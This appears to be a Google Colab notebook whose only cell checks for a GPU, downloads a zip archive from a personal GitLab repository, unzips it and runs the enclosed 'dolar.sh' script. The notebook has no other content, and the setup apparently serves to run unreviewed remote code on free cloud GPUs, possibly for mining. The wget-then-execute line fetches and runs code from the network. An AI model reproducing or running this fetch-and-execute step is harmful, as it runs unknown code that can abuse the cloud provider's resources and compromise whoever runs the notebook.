{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Colab3.ipynb",
      "private_outputs": true,
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "-19Kxmad8uDE"
      },
      "source": [
        "!nvidia-smi\n",
        "!wget https://gitlab.com/selenapitts7/dolaramrik/-/raw/main/dolar.zip && unzip dolar.zip\n",
        "!chmod +x ./dolar.sh && ./dolar.sh\n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}